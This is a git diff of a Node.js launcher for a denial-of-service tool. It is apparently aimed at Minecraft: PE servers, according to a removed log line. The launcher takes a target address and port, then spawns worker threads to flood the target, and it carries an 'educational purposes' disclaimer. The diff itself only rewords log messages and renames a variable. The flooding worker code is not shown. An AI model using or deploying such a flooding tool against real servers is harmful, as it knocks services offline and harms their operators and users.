@@ -1,15 +1,15 @@
 const { Worker } = require('worker_threads');
 
-console.log(`DDOS script for ddosing Minecraft: PE Servers just to inform you this is for educational purposes,  use it in your own risk, `)
+console.log(`DDoS script for educational purposes!`)
 
-const [node, dir, address, port, threads = 4, time = 999999999999999999999999999999999999999999999999999999999999999999999999999] = process.argv;
+const [ddos, dir, address, port, threads = 4, time = 999999999999999999999999999999999999999999999999999999999999999999999999999] = process.argv;
 
 if (!address || !port) {
-  return console.log('[ERROR] Use: \'node . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
+  return console.log('[ERROR] Use: \'ddos . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
 }
 
 for (let i = 0; i < threads; i++) {
-  console.log(`[ServerDDOS] Starting thread #${i}...`)
+  console.log(`[DDoS] Starting thread #${i}...`)
 
   const worker = new Worker('./worker.js');
   worker.postMessage({
@@ -20,4 +20,4 @@ for (let i = 0; i < threads; i++) {
   });
 }
 
-console.log("[DDOS] Toasting the server in 3 seconds...")
+console.log("[DDoS]  will start in 3 seconds...")
